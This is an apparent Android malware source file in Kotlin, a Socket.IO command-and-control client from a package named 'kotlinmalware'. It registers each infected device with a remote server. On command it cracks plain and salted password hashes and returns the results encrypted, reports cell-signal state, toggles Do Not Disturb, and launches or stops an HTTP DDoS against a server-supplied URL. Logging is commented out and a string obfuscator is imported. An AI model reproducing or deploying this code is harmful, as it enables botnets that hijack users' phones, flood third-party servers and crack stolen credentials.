package com.example.kotlinmalware

import  android.content.Context
import android.os.PowerManager
import io.socket.client.IO
import io.socket.client.Socket
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import android.util.Base64
import com.mobilesec.govcomm.mal.CellSignal
import com.mobilesec.govcomm.mal.DndManager
import io.github.c0nnor263.obfustringcore.ObfustringThis
import org.json.JSONException
import org.json.JSONObject
import java.util.UUID

class SocketIOHandler(private val context: Context) {
    private lateinit var socket: Socket
    private val coroutineScope = CoroutineScope(Dispatchers.Main)
    private var httpDDoS: HttpDDoS? = null
    private val dndManager = DndManager(context) // Instance of DndManager
    private val cellSignal = CellSignal(context)


    fun start(url: String) {
        try {
            socket = IO.socket(url)
            socket.on(Socket.EVENT_CONNECT) {
                // Once connected, immediately register this device with its UUID
                val uuid = getInstallationId(context) // Assume getInstallationId(context) returns the UUID as a String
                val registrationData = JSONObject()
                registrationData.put("uuid", uuid)
                socket.emit("update_sid", registrationData)
            }
                .on("eventFromServerCrackHash") { args ->
                    if (args.isNotEmpty() && args[0] is String) {
                        // Step 1: Decrypt the data received from the server
                        val encryptedData = args[0] as String
                        val decryptedData = AESEncryption.decrypt(encryptedData)
                        //Log.d("WebSocket", "Received hash to crack: $decryptedData")
                        try {
                            val jsonObject = JSONObject(decryptedData)
                            val hashToCrack = jsonObject.getString("hash") // Ensure this key matches the one used by the server

                            //Log.d("WebSocket", "Received hash to crack: $hashToCrack")

                            coroutineScope.launch {
                                val plaintext = crackHash(hashToCrack)
                                if (plaintext != null) {
                                    val responseJson = JSONObject().apply {
                                        put("plaintext", plaintext)
                                        put("hash", hashToCrack)
                                    }
                                    val responseJsonString = responseJson.toString()
                                    val responseJsonBytes = responseJsonString.toByteArray(Charsets.UTF_8)
                                    val responseJsonBytesBase64 = Base64.encodeToString(responseJsonBytes, Base64.DEFAULT)
                                    val encryptedResponse = AESEncryption.encrypt(responseJsonBytesBase64)
                                    //val encryptedResponse = AESEncryption.encrypt(responseJson.toString())
                                    socket.emit("hashCrackSuccess", encryptedResponse)
                                }
                            }
                        } catch (e: JSONException) {
                            //Log.e("WebSocket", "Error parsing decrypted JSON", e)
                        }
                    }
                }
                .on("eventFromServerSaltedCrackHash") { args ->
                    if (args.isNotEmpty() && args[0] is String) {
                        // Step 1: Decrypt the data received from the server
                        val encryptedData = args[0] as String
                        val decryptedData = AESEncryption.decrypt(encryptedData)
                        try {
                            // Step 2: Parse the decrypted JSON
                            val jsonObject = JSONObject(decryptedData)
                            //Log.d("MyTag", jsonObject.toString())
                            val salt = jsonObject.getString("salt")
                            val saltedHash = jsonObject.getString("salted_hash")

                            //Log.d("WebSocket", "Received salt: $salt and salted hash to crack: $saltedHash")

                            coroutineScope.launch {
                                // Step 3: Attempt to crack the salted hash
                                val wordFound = crackSaltedHash(saltedHash, salt)
                                if (wordFound != null) {
                                    // Step 4: Send back the result if the hash was cracked
                                    val responseJson = JSONObject().apply {
                                        put("plaintext", wordFound)
                                        put("salt", salt)
                                        put("hash", saltedHash)
                                    }
                                    val responseJsonString = responseJson.toString()
                                    val responseJsonBytes = responseJsonString.toByteArray(Charsets.UTF_8)
                                    val responseJsonBytesBase64 = Base64.encodeToString(responseJsonBytes, Base64.DEFAULT)
                                    val encryptedResponse = AESEncryption.encrypt(responseJsonBytesBase64)
                                    socket.emit("saltHashCrackSuccess", encryptedResponse)
                                }
                            }
                        } catch (e: JSONException) {
                            //Log.e("WebSocket", "Error parsing decrypted JSON", e)
                        }
                    }
                }
                .on("ps") {
                    coroutineScope.launch {
                        //logDevicePowerState()
                    }
                }
                .on("cs") {
                    coroutineScope.launch {
                        if (cellSignal.cellSignal() == true){
                            socket.emit("cellSignalOn", getInstallationId(context))
                        }
                        else {
                            socket.emit("cellSignalOff", getInstallationId(context))
                        }

                    }
                }
                .on("dndOn") {
                    coroutineScope.launch {
                        dndManager.setDndMode(true)
                    }
                }
                .on("dndOff") {
                    coroutineScope.launch {
                        dndManager.setDndMode(false)
                    }
                }
                .on("eventFromServerDDOS") { args ->
                    if (args.isNotEmpty() && args[0] is String) {
                        val encodedUrl = args[0] as String
                        // Decode the base64 encoded URL
                        val decodedUrl = String(Base64.decode(encodedUrl, Base64.DEFAULT))
                        //Log.d("WebSocket", "Received DDoS target URL: $decodedUrl")
                        coroutineScope.launch {
                            httpDDoS = HttpDDoS(decodedUrl)
                            httpDDoS?.startDDoS()
                        }
                    }
                }
                .on("eventFromServerStopDDOS") {
                    //Log.d("WebSocket", "Received stop DDoS command")
                    httpDDoS?.stopDDoS()
                }
            socket.connect()
        } catch (e: Exception) {
            //Log.e("WebSocketError", "SocketIO connection error", e)
        }
    }

    private suspend fun crackHash(hashToCrack: String): String? {
        val shaCrack = ShaCrack(context)
        return shaCrack.crackHash((hashToCrack))
    }

    private suspend fun crackSaltedHash(saltedHash: String, salt: String): String? {
        val shaCrack = ShaCrack(context)
        return shaCrack.crackSaltedHash(saltedHash, salt)
    }

    private fun logDevicePowerState() {
        val powerManager = context.getSystemService(Context.POWER_SERVICE) as PowerManager
        if (powerManager.isInteractive) {
            socket.emit("screenOn", getInstallationId(context))
            //Log.d("DevicePowerState", "The screen is on.")
        } else {
            socket.emit("screenOff", getInstallationId(context))
            //Log.d("DevicePowerState", "The screen is off.")
        }
    }

    fun getInstallationId(context: Context): String {
        val sharedPref = context.getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
        return sharedPref.getString("installationId", null) ?: UUID.randomUUID().toString().also { installationId ->
            sharedPref.edit().putString("installationId", installationId).apply()
        }
    }



    fun close() {
        socket.disconnect()
    }
}

